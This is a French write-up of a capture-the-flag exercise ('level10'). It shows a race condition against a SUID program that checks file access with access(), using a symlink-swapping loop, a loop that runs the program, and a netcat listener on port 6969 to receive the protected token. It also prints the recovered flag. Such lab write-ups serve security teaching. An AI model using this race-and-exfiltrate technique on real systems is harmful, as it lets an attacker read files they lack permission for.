# Level10

[ENGLISH version](README_EN.md)

## Comment récuperer le flag

On peut voir que le level10 est un executable et possède un SUID.

Il y a également un fichier token qui n'est lisible que par flag10.

En lancant level10, l'executable donne l'usage suivant:

```
./level10 file host
	sends file to host if you have access to it
```

En décompilant level10, on s'appercoit que le programme envoie des données sur le port 6969.
Il utilise également access() pour vérifier si l'on a accès au fichier.

On peut lancer un serveur netcat qui va écouter sur le port 6969 avec nc:

```
nc -lv localhost 6969
```

Quel que soit le lien symbolic que nous faisons, acces() retourne une erreur.

Pour passer, nous sommes obligés de forcer.

Le but est de forcer l'accès au token, meme si l'on manque de droit.

Dans un 1er terminal:

```
// Boucle infinie: Le but est de créer des liens temporaire a l'infini
while true; do rm -rf /tmp/truc; touch /tmp/truc; ln -sfn ~/token /tmp/truc; done
```

A noter que pour passer access, le fichier DOIT Être crée par l'user, d'ou le touch.

Dans un 2ème terminal:

```
// Essayer d'envoyer le lien symbolique sur le serveur
while true; do (~/level10 /tmp/truc 127.0.0.1); done
```

Dans un 3ème terminal: 

```
// Lire en boucle sur le serveur.
// Nous sommes obligés de faire un boucle car sinon nc stoppe après 1 reception
while true; do nc -l 6969 ;done
```

Le flag pour se connecter au user flag10 est le suivant: woupa2yuojeeaaed06riuj63c

## Le flag

```
woupa2yuojeeaaed06riuj63c
```

Ce token permet de se connecter au flag10 et de récuperer le token pour le level 11